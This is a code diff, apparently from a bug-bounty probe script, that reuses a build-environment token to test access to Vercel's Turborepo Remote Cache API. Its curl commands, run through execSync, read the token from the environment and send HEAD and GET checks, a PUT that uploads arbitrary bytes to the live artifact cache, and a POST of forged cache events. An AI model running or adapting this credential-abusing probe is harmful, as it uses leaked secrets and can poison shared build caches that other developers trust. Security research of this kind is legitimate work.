@@ -237,34 +237,41 @@ const report = {
 
     // ALWAYS probe the Turborepo Remote Cache API (whether JWT or opaque)
     const ownerId = (claims?.data?.ownerId) || process.env.VERCEL_ARTIFACTS_OWNER || '';
-    const apiBase = 'https://vercel.com/api/remote-cache/v8/artifacts';
+    // Correct path: /api/v8/artifacts (NOT /api/remote-cache/v8/artifacts — that 404s)
+    const apiBase = 'https://vercel.com/api/v8/artifacts';
 
-    // List artifacts — proves team-level read scope
-    const listStatus = safe(() => execSync(
-      `curl -s --max-time 8 -o /tmp/art_list -w '%{http_code}' -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}?teamId=${ownerId}&limit=5' 2>/dev/null || true`
+    // HEAD check for a known-bad hash — 404=not found (auth OK), 403/401=auth fail
+    const headStatus = safe(() => execSync(
+      `curl -s --max-time 8 -o /tmp/art_head -w '%{http_code}' -I -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}/deadbeef1234deadbeef1234deadbeef12345678?teamId=${ownerId}' 2>/dev/null || true`
     ).toString().trim());
-    const listBody = safe(() => readFileSync('/tmp/art_list', 'utf8').slice(0, 400));
 
-    // Events/query endpoint — lists recent artifact activity
+    // GET download test (expect 404 for nonexistent hash if auth succeeds)
+    const getStatus = safe(() => execSync(
+      `curl -s --max-time 8 -o /tmp/art_get -w '%{http_code}' -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}/deadbeef1234deadbeef1234deadbeef12345678?teamId=${ownerId}' 2>/dev/null || true`
+    ).toString().trim());
+    const getBody = safe(() => readFileSync('/tmp/art_get', 'utf8').slice(0, 200));
+
+    // PUT upload test — proves API_ARTIFACTS_UPLOAD is live-usable
+    const putStatus = safe(() => execSync(
+      `curl -s --max-time 8 -o /tmp/art_put -w '%{http_code}' -X PUT -H 'Authorization: Bearer ${tok}' -H 'Content-Type: application/octet-stream' -H 'x-artifact-client-ci: vercel' -H 'x-artifact-duration: 1000' -d 'probe-bounty-artifact-test' '${apiBase}/beefdeadbeefdeadbeefdeadbeefdeadbeef1337?teamId=${ownerId}' 2>/dev/null || true`
+    ).toString().trim());
+    const putBody = safe(() => readFileSync('/tmp/art_put', 'utf8').slice(0, 200));
+
+    // Events POST — record cache events
     const eventsStatus = safe(() => execSync(
-      `curl -s --max-time 8 -o /tmp/art_events -w '%{http_code}' -X POST -H 'Authorization: Bearer ${tok}' -H 'Content-Type: application/json' -H 'x-artifact-client-ci: vercel' '${apiBase}/events?teamId=${ownerId}' -d '{"sessionId":"probe-bounty-test"}' 2>/dev/null || true`
+      `curl -s --max-time 8 -o /tmp/art_events -w '%{http_code}' -X POST -H 'Authorization: Bearer ${tok}' -H 'Content-Type: application/json' -H 'x-artifact-client-ci: vercel' '${apiBase}/events?teamId=${ownerId}' -d '{"sessionId":"probe-bounty","source":"LOCAL","event":[{"sessionId":"probe","duration":1,"hash":"deadbeef1234deadbeef1234deadbeef12345678","tag":"HIT"}]}' 2>/dev/null || true`
     ).toString().trim());
-    const eventsBody = safe(() => readFileSync('/tmp/art_events', 'utf8').slice(0, 400));
-
-    // Exists check for a known-invalid hash — test auth (200=found, 404=not found, 403=authn fail)
-    const existsStatus = safe(() => execSync(
-      `curl -s --max-time 8 -o /tmp/art_exists -w '%{http_code}' -H 'Authorization: Bearer ${tok}' -H 'x-artifact-client-ci: vercel' '${apiBase}/deadbeef1234567890abcdef12345678?teamId=${ownerId}' 2>/dev/null || true`
-    ).toString().trim());
-    const existsBody = safe(() => readFileSync('/tmp/art_exists', 'utf8').slice(0, 200));
+    const eventsBody = safe(() => readFileSync('/tmp/art_events', 'utf8').slice(0, 200));
 
     return {
       type: claims ? 'jwt' : 'opaque',
       claims,
       len: tok.length,
       ownerId,
-      listStatus, listBody,
+      headStatus,
+      getStatus, getBody,
+      putStatus, putBody,
       eventsStatus, eventsBody,
-      existsStatus, existsBody,
     };
   }),
   // VERCEL_DEPLOYMENT_KEY — unknown 44-char key; probe against Vercel API as Bearer token
